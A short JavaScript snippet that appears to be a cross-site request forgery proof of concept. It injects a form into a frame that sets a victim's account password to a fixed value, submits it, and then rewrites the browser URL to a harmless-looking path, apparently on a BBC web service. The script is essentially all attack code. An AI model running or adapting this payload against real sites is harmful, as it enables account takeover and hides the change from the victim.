console.log("I'm here");
window.frames[0].document.documentElement.innerHTML = '<form name="frm1"> <input type="text" name="confirmpassword" value="loxnon28"> <input type="text" name="confirmpassword_confirm" value="loxnon28"> <input type="text" name="bbcid_submit_button" value="Save"></form>';
document.getElementById('frm1').submit();
window.history.pushState("object or string", "Title", "/frameworks/barlesque/webservice/body_first.html?blq_gvl=311");
